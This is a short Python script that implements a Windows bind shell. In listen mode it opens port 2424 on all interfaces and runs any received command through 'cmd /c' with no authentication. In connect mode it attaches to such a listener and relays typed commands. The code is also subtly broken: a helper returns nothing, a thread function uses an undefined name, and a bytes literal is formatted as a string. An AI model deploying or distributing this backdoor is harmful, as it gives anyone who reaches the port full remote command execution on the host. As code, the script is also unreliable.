import socket, subprocess, argparse, threading

DEFAULT_PORT = 2424
MAX_BUFFER   = 4096

def execute_cmd(cmd):
	try:
		output = subprocess.check_output("cmd /c {}".format(cmd), stderr=subprocess.STDOUT)
	except:
		output = b"command failed!!"
	return output 

def decode_and_strip(s):
	s.decode("latin-1").strip()

def shell_thread(s):

	s.send(b"[ -- CONNECTED --  !!]")

	try:
		while True:
			s.send(b"\n\rENTER COMMAND>")

			data = s.recv(MAX_BUFFER)

			if data:
				buffer = decode_and_strip(data)
				if not buffer or buffer == "exit":
					s.close()
					exit()

			print(b"Executing command {} !>".format(buffer))
			s.send(execute_cmd(buffer))

	except:
		s.close()
		exit()


def send_thread(S):
	try:
		while True:
			data = input()+"\n"
			s.send(data.encode("latin-1"))
	except:
		s.close()
		exit()

def recv_thread(s):
	try:
		while True:
			data = decode_and_strip(s.recv(MAX_BUFFER))
			if data:
				print("\n" + data , end="", flush=True)
	except:
		s.close()
		exit()


def server():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("0.0.0.0",DEFAULT_PORT))
	s.listen()

	print("[-- Starting Bind Shell --!]")
	while True:
		client_socket, addr = s.accept()
		print("[-- new user connected --]")
		threading.Thread(target=shell_thread, args=(client_socket,)).start()

def client(ip):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, DEFAULT_PORT))

	print("[-- connecting to bind shell --]")

	threading.Thread(target=send_thread, args=(s,)).start()
	threading.Thread(target=recv_thread, args=(s,)).start()

parser = argparse.ArgumentParser()
parser.add_argument("-l","--listen",action="store_true",help="to listen the shell", required=False)
parser.add_argument("-c","--connect",help="connect to bind shell",required= False)
args = parser.parse_args()


if args.listen:
	server()
elif args.connect:
	client(args.connect)











